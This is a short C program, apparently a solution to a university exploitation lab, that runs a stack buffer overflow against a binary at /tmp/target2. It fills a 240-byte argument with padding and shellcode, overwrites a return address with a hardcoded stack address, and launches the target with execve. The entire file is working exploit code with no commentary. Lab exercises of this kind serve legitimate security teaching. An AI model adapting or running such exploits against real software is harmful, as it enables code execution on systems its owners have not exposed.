#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char input[241];
  input[240] = '\0';
  
  int junk = 240 - strlen(shellcode) - 4 + (strlen(shellcode) % 4);
  int i;
  for (i = 0 ; i < 240 ; i++) {
	  if (i < junk || i >= junk + strlen(shellcode)) input[i] = 'f';
	  else input[i] = shellcode[i - junk];
  }
  
  input[124] = '\x48';
  input[125] = '\xfd';
  input[126] = '\xff';
  input[127] = '\xbf';

  args[0] = TARGET; args[1] = input; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
